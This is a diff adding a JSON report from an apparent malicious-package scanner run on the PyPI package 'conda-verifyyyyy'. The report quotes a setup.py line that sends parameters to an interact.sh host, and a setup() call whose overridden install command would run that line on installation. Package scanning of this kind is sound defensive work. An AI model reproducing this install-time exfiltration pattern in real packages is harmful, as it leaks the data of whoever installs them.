@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:16",
+                "code": "        requests.get(\"https://cbsbeka2vtc00001d14ggfhizjayyyyyb.interact.sh\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(name='conda-verifyyyyy', #package name\n      version='25.25.25',\n      description='test',\n      author='Saumya_Agrawal',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/conda-verifyyyyy-25.25.25"
+}
